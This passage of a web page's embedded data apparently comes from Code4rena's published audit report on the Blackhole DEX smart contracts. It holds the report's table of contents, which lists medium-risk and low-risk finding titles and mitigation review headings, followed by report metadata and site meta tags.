href=\"#m-01-minterupgradeable-double-subtracting-smnft-burns-causes-rebase-underpayment\"\u003e[M-01] \u003ccode\u003eMinterUpgradeable\u003c/code\u003e: double-subtracting smNFT burns causes rebase underpayment\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-02-critical-access-control-flaw-role-removal-logic-incorrectly-grants-unauthorized-roles\"\u003e[M-02] Critical access control flaw: Role removal logic incorrectly grants unauthorized roles\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-03-1e10-fixed-farming-reward-in-gaugefactorycl\"\u003e[M-03] \u003ccode\u003e1e10\u003c/code\u003e fixed farming reward in \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-04-logic-error-in-avm-original-owner-resolution\"\u003e[M-04] Logic error in AVM original owner resolution\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-05-griefing-attack-on-genesispoolmanagersoldepositnativetoken-leading-to-denial-of-service\"\u003e[M-05] Griefing attack on \u003ccode\u003eGenesisPoolManager.sol::depositNativeToken\u003c/code\u003e leading to Denial of Service\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-06-first-liquidity-provider-can-dos-the-pool-of-a-stable-pair\"\u003e[M-06] First liquidity provider can DOS the pool of a stable pair\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-07-isgenesisflag-is-ineffective-to-control-add-liquidity-flow-in-routerv2addliquidity\"\u003e[M-07] \u003ccode\u003eisGenesis\u003c/code\u003e flag is ineffective to control add liquidity flow in \u003ccode\u003eRouterV2.addLiquidity()\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-08-function-return-variable-shadowing-prevents-storage-updates-in-solidity\"\u003e[M-08] Function return variable shadowing prevents storage updates in solidity\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-09-zero-receiver-fund-burn\"\u003e[M-09] Zero-receiver fund burn\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-10-erc-2612-permit-front-running-in-routerv2-enables-dos-of-liquidity-operations\"\u003e[M-10] ERC-2612 permit front-running in RouterV2 enables DoS of liquidity operations\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-11-incorrect-function-call-in-bribefactoryv3-recovererc20andupdatedata\"\u003e[M-11] Incorrect function call in \u003ccode\u003eBribeFactoryV3\u003c/code\u003e \u003ccode\u003erecoverERC20AndUpdateData\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-12-epoch-voting-restrictions-bypassed-via-deposit_for-for-blacklistednon-whitelisted-tokenids\"\u003e[M-12] Epoch voting restrictions bypassed via \u003ccode\u003edeposit_for()\u003c/code\u003e for blacklisted/non-whitelisted \u003ccode\u003etokenID\u003c/code\u003es\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-13-eip-712-domain-type-hash-mismatch-breaks-signature-based-delegation\"\u003e[M-13] EIP-712 domain type hash mismatch breaks signature-based delegation\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#governor\"\u003eGovernor\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#medium-risk-findings-9\"\u003eMedium Risk Findings (9)\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#m-14-checkpoints-are-incorrectly-cleared-during-transferfrom\"\u003e[M-14] Checkpoints are incorrectly cleared during \u003ccode\u003etransferFrom\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-15-l2governorexecute-accepts-expired--defeated-proposals-attacker-front-runs-blackgovernor-nudge-blocks-legitimate-emission-rate-votes-freezes-tail-emissions\"\u003e[M-15] \u003ccode\u003eL2Governor.execute()\u003c/code\u003e accepts \u003ccode\u003eExpired\u003c/code\u003e / \u003ccode\u003eDefeated\u003c/code\u003e proposals, attacker front-runs \u003ccode\u003eBlackGovernor\u003c/code\u003e \u003ccode\u003enudge()\u003c/code\u003e, blocks legitimate emission-rate votes, freezes tail emissions\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-16-getvotes-inside-the-blackgovernor-incorrectly-provides-blocknumber-instead-of-blocktimestamp-leading-to-complete-dos-of-proposal-functionality\"\u003e[M-16] \u003ccode\u003egetVotes\u003c/code\u003e inside the \u003ccode\u003eBlackGovernor\u003c/code\u003e incorrectly provides \u003ccode\u003eblock.number\u003c/code\u003e instead of \u003ccode\u003eblock.timestamp\u003c/code\u003e, leading to complete DOS of proposal functionality\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-17-users-can-cast-their-votes-multiple-times-for-the-proposal-by-transferring-their-nfts-and-then-voting-again\"\u003e[M-17] Users can cast their votes multiple times for the proposal by transferring their nfts and then voting again\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-18-status-does-not-update-inside-the-blackgovernor-leading-to-complete-distribution-of-nudge-functionality\"\u003e[M-18] Status does not update inside the \u003ccode\u003eBlackGovernor\u003c/code\u003e leading to complete distribution of nudge functionality\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-19-quorum-does-not-include-the-againstvotes-leading-to-emissions-rate-staying-the-same-even-if-it-should-decrease\"\u003e[M-19] Quorum does not include the \u003ccode\u003eagainstVotes\u003c/code\u003e leading to emissions rate staying the same even if it should decrease\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-20-getsmnftpastvotes-incorrectly-checks-for-voting-power-leading-to-some-nfts-incorrectly-being-eligible-to-vote\"\u003e[M-20] \u003ccode\u003egetsmNFTPastVotes\u003c/code\u003e incorrectly checks for Voting Power leading to some NFTs incorrectly being eligible to vote\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-21-governance-emission-adjustment-ignored-when-weekly-emission-above-tail-threshold\"\u003e[M-21] Governance emission adjustment ignored when weekly emission above tail threshold\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-22-governance-deadlock-potential-in-blackgovernorsol-due-to-quorum-mismatch\"\u003e[M-22] Governance deadlock potential in \u003ccode\u003eBlackGovernor.sol\u003c/code\u003e due to quorum mismatch\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#low-risk-and-non-critical-issues\"\u003eLow Risk and Non-Critical Issues\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#01-early-returning-in-_blacklist-and-blacklistconnector-function-prevents-emission-of-blacklisted-event-and-blacklistconnector-event-respectively\"\u003e01 Early returning in \u003ccode\u003e_blacklist()\u003c/code\u003e and \u003ccode\u003eblacklistConnector\u003c/code\u003e function prevents emission of blacklisted event and blacklistConnector event respectively\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#02-incomplete-implementation-of-purchased-function-in-auction-contract\"\u003e02 Incomplete implementation of \u003ccode\u003epurchased\u003c/code\u003e function in Auction contract\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#03-stack-too-deep-error-in-inline-assembly-variable-headstart\"\u003e03 Stack too deep error in inline assembly (variable \u003ccode\u003eheadStart\u003c/code\u003e)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#04-hardcoded-manager-lacks-ability-to-renounce-control\"\u003e04 Hardcoded manager lacks ability to renounce control\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#05-precision-loss-in-smnft-bonus-calculation-may-result-in-zero-bonus-when-updating-to-smnft\"\u003e05 Precision loss in smNFT bonus calculation may result in zero bonus when updating to smNFT\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#06-getvotes-wiew-function-becomes-unusable-when-a-user-owns-too-many-locks\"\u003e06 \u003ccode\u003egetVotes()\u003c/code\u003e wiew function becomes unusable when a user owns too many locks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#07-distributeall-function-at-risk-of-repeated-failure-due-to-unbounded-loop-over-gauges\"\u003e07 \u003ccode\u003edistributeAll()\u003c/code\u003e function at risk of repeated failure due to unbounded loop over gauges\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#08-fee-recipient-may-remain-set-to-previous-owner\"\u003e08 Fee recipient may remain set to previous owner\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#09-incorrect-setrouter-function-only-allows-zero-address-to-pass\"\u003e09 Incorrect \u003ccode\u003esetRouter\u003c/code\u003e function only allows zero address to pass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#10-misaligned-access-control-on-settopnpools-function\"\u003e10 Misaligned access control on \u003ccode\u003esetTopNPools()\u003c/code\u003e function\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#11-governancecentralization-risks-21-contracts-covered\"\u003e11 Governance/centralization Risks (21 contracts covered)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#12-function-declaration-does-not-follow-solidity-style-guide-at-fixedauctionsol\"\u003e12 Function declaration does not follow Solidity style guide at \u003ccode\u003eFixedAuction.sol\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#13-incorrect-require-statement-for-address-check-at-gaugev2sol\"\u003e13 Incorrect require statement for address check at \u003ccode\u003eGaugeV2.sol\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#mitigation-review\"\u003eMitigation Review\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#mitigation-review-scope--summary\"\u003eMitigation Review Scope \u0026#x26; Summary\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-05-unmitigated\"\u003e[M-05] Unmitigated\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-10-unmitigated\"\u003e[M-10] Unmitigated\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#disclosures\"\u003eDisclosures\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e"])</script><script>self.__next_f.push([1,"1b:{\"name\":\"Blackhole\",\"link\":\"https://x.com/BlackHoleDEX\",\"imageUrl\":\"https://code4-api-v0-public-storage.s3.us-east-1.amazonaws.com/upload-GRH9BLXzGEX\"}\n1c:{\"start_time\":\"2025-05-28T20:00:00.000Z\",\"end_time\":\"2025-06-09T20:00:00.000Z\",\"bot_race_time_limit\":1}\n18:{\"uid\":\"hRRPHzUEptK\",\"slug\":\"2025-05-blackhole\",\"title\":\"Blackhole\",\"sponsor\":\"Blackhole\",\"date\":\"2025-07-03\",\"findings\":\"https://code4rena.com/audits/2025-05-blackhole/submissions\",\"contest\":507,\"alt_url\":null,\"html\":\"$19\",\"toc\":\"$1a\",\"created_at\":\"2025-07-03T13:36:36.190Z\",\"updated_at\":\"2025-07-03T13:36:36.190Z\",\"sponsor_data\":\"$1b\",\"contest_data\":\"$1c\"}\n8:[\"$\",\"$L13\",null,{\"landingPage\":[\"$\",\"$L14\",null,{\"report\":{\"uid\":\"hRRPHzUEptK\",\"slug\":\"2025-05-blackhole\",\"title\":\"Blackhole\",\"sponsor\":\"Blackhole\",\"date\":\"2025-07-03\",\"findings\":\"https://code4rena.com/audits/2025-05-blackhole/submissions\",\"contest\":507,\"alt_url\":null,\"html\":\"$15\",\"toc\":\"$16\",\"created_at\":\"2025-07-03T13:36:36.190Z\",\"updated_at\":\"2025-07-03T13:36:36.190Z\",\"sponsor_data\":{\"name\":\"Blackhole\",\"link\":\"https://x.com/BlackHoleDEX\",\"imageUrl\":\"https://code4-api-v0-public-storage.s3.us-east-1.amazonaws.com/upload-GRH9BLXzGEX\"},\"contest_data\":{\"start_time\":\"2025-05-28T20:00:00.000Z\",\"end_time\":\"2025-06-09T20:00:00.000Z\",\"bot_race_time_limit\":1}}}],\"coreAppPage\":[\"$\",\"$L17\",null,{\"report\":\"$18\"}]}]\ne:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",\"1\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"2\",{\"children\":\"Code4rena | Keeping high severity bugs out of production\"}],[\"$\",\"meta\",\"3\",{\"name\":\"description\",\"content\":\"Top auditors compete to keep high severity bugs out of production. Start a public or private audit within 48 hours.\"}],[\"$\",\"meta\",\"4\",{\"name\":\"application-name\",\"content\":\"Code4rena | Keeping high severity bugs out of production\"}],[\"$\",\"meta\",\"5\",{\"property\":\"og:title\",\"content\":\"Code4rena\"}],[\"$\",\"meta\",\"6\",{\"property\":\"og:description\",\"content\":\"Code4rena is a competitive audit platform that finds more high-severity vulnerabilities, mo"])</script><script>self.__next_f.push([1,"re quickly than any other auditing method.\"}],[\"$\",\"meta\",\"7\",{\"property\":\"og:site_name\",\"content\":\"Code4rena\"}],[\"$\",\"meta\",\"8\",{\"property\":\"og:image\",\"content\":\"https://code4rena.com/images/c4/c4-og-v2.png\"}],[\"$\",\"meta\",\"9\",{\"property\":\"og:type\",\"content\":\"website\"}],[\"$\",\"meta\",\"10\",{\"name\":\"twitter:card\",\"content\":\"summary_large_image\"}],[\"$\",\"meta\",\"11\",{\"name\":\"twitter:title\",\"content\":\"Code4rena\"}],[\"$\",\"meta\",\"12\",{\"name\":\"twitter:description\",\"content\":\"Code4rena is a competitive audit platform that finds more high-severity vulnerabilities, more quickly than any other auditing method.\"}],[\"$\",\"meta\",\"13\",{\"name\":\"twitter:image\",\"content\":\"https://code4rena.com/images/c4/c4-og-v2.png\"}],[\"$\",\"link\",\"14\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"256x256\"}],[\"$\",\"link\",\"15\",{\"rel\":\"icon\",\"href\":\"/logos/c4/c4-favicon-32.png\"}],[\"$\",\"link\",\"16\",{\"rel\":\"apple-touch-icon\",\"href\":\"/logos/c4/apple-touch-icon.png\"}],[\"$\",\"meta\",\"17\",{\"name\":\"next-size-adjust\"}]]\n7:null\n"])</script></body></html>